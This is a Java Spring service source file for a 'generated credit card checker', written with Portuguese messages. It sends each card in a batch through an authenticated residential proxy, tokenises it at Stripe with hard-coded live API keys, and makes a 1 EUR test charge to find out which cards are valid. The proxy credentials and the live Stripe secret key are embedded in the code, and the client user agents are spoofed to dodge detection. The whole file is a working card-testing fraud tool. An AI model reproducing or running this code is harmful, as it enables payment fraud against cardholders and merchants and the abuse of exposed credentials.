package com.generatedcreditcardchecker.service;

import com.generatedcreditcardchecker.request.GeneratedCreditCardInfo;
import com.generatedcreditcardchecker.request.GeneratedCreditCardRequest;
import com.generatedcreditcardchecker.response.CreditCardPaymentResponse;
import com.generatedcreditcardchecker.response.CreditCardResponse;
import com.generatedcreditcardchecker.response.TokenResponse;
import org.apache.http.HttpHost;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.CredentialsProvider;
import org.apache.http.impl.client.BasicCredentialsProvider;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.ProxyAuthenticationStrategy;
import org.json.JSONObject;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.web.client.RestTemplateBuilder;

import org.springframework.http.*;
import org.springframework.http.client.HttpComponentsClientHttpRequestFactory;
import org.springframework.stereotype.Service;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.HttpClientErrorException;
import org.springframework.web.client.RestTemplate;

import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

@Service
public class CheckService {
        RestTemplate restTemplate;

        @Autowired
        public CheckService(RestTemplateBuilder restTemplateBuilder) {
                this.restTemplate = restTemplateBuilder
                                .build();
        }

        public List<CreditCardResponse> checkCreditCardGenerated(
                        GeneratedCreditCardRequest generatedCreditCardRequest) {

                List<CreditCardResponse> result = new ArrayList<>();

                generatedCreditCardRequest.getCreditCardGenerated().forEach(card -> {
                        try {
                                String idToken = Objects.requireNonNull(getTokenStripe(card).getBody()).getId();
                                HttpStatus response = checkCharge(idToken).getStatusCode();

                                if (response.is2xxSuccessful()) {

                                        CreditCardResponse cardResult = CreditCardResponse.builder()
                                                        .creditCard(card.getCardNumber() + "|" + card.getExpMonth()
                                                                        + "|" + card.getExpYear() + "|"
                                                                        + card.getSecurityCode())
                                                        .isOk(true)
                                                        .message("Cartão ok")
                                                        .build();
                                        result.add(cardResult);
                                }
                        } catch (HttpClientErrorException e) {
                                final JSONObject obj = new JSONObject(e.getResponseBodyAsString());
                                JSONObject content = obj.getJSONObject("error");
                                CreditCardResponse cardResult = CreditCardResponse.builder()
                                                .creditCard(card.getCardNumber() + "|" + card.getExpMonth() + "|"
                                                                + card.getExpYear() + "|"
                                                                + card.getSecurityCode())
                                                .type(content.getString("type"))
                                                .message(content.getString("message"))
                                                .decline_code(content.getString("decline_code"))
                                                .isOk(false)
                                                .code(content.getString("code"))
                                                .build();
                                result.add(cardResult);
                                System.out.println("Resultado:" + cardResult);
                        } catch (Exception e) {
                                System.out.println();
                        }
                });
                return result;
        }

        public ResponseEntity<TokenResponse> getTokenStripe(GeneratedCreditCardInfo card) {

                CredentialsProvider credsProvider = new BasicCredentialsProvider();

                credsProvider.setCredentials(new AuthScope("geo.iproyal.com", 12323),
                                new UsernamePasswordCredentials("luska", "fodase123"));
                HttpClientBuilder clientBuilder = HttpClientBuilder.create();

                clientBuilder.useSystemProperties();
                clientBuilder.setProxy(new HttpHost("geo.iproyal.com", 12323));
                clientBuilder.setDefaultCredentialsProvider(credsProvider);
                clientBuilder.setProxyAuthenticationStrategy(new ProxyAuthenticationStrategy());

                CloseableHttpClient client = clientBuilder.build();

                HttpComponentsClientHttpRequestFactory factory = new HttpComponentsClientHttpRequestFactory();
                factory.setHttpClient(client);

                restTemplate.setRequestFactory(factory);

                String url = "https://api.stripe.com/v1/tokens";
                String body = "card%5Bnumber%5D=" + card.getCardNumber() + "+&card%5Bexp_month%5D="
                                + card.getExpMonth()
                                + "&card%5Bexp_year%5D=" + card.getExpYear() + "&card%5Baddress_zip%5D=" + 47100000
                                + "";

                MultiValueMap<String, String> params = new LinkedMultiValueMap<>();
                params.add("X-Stripe-Client-User-Agent",
                                "{\"os.name\":\"android\",\"os.version\":\"29\",\"bindings.version\":\"16.2.0\",\"lang\":\"Java\",\"publisher\":\"Stripe\",\"http.agent\":\"Dalvik\\/2.1.0 (Linux; U; Android 10.0; Redmi Note 6 Pro MIUI\\/PORTED BY TeamMODMii)\"}");
                params.add("User-Agent'", "Stripe/v1 AndroidBindings/16.2.0");
                params.add("Authorization",
                                "Bearer pk_live_51HOnejHITXSnOc3DsaRR1KlE9mGeIhoQpxKCC2LX8xTUBz60mmWqytDx3BHZRmk9O7H9GhC4xIERW5wIznvanAyo008SYWgfrh");
                params.add("content-type", "application/x-www-form-urlencoded; charset=UTF-8");
                params.add("accept-encoding", "gzip, deflate, br");

                HttpHeaders headers = new HttpHeaders(params);
                headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
                HttpEntity<String> entity = new HttpEntity<>(body, headers);

                return restTemplate.exchange(url, HttpMethod.POST, entity, TokenResponse.class);

        }

        public ResponseEntity<CreditCardPaymentResponse> checkCharge(String idToken) {

                String url = "https://api.stripe.com/v1/charges";
                String body = "amount=100&description=VIP+1+ANO%2BIPTV&currency=EUR&source=" + idToken + "";

                MultiValueMap<String, String> params = new LinkedMultiValueMap<>();
                params.add("X-Stripe-Client-User-Agent",
                                "{\"java.vendor\":\"The Android Project\",\"java.version\":\"0\",\"java.vm.version\":\"2.1.0\",\"os.arch\":\"aarch64\",\"os.name\":\"Linux\",\"publisher\":\"Stripe\",\"java.vm.vendor\":\"The Android Project\",\"lang\":\"Java\",\"os.version\":\"4.4.239-#Deagle-V6\",\"bindings.version\":\"20.35.0\"}");
                params.add("User-Agent'", "Stripe/v1 JavaBindings/20.35.0");
                params.add("Authorization",
                                "Bearer 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");
                params.add("content-type", "application/x-www-form-urlencoded; charset=UTF-8");
                params.add("accept-encoding", "gzip, deflate, br");

                HttpHeaders headers = new HttpHeaders(params);
                headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
                HttpEntity<String> entity = new HttpEntity<>(body, headers);

                return restTemplate.exchange(url, HttpMethod.POST, entity, CreditCardPaymentResponse.class);

        }
}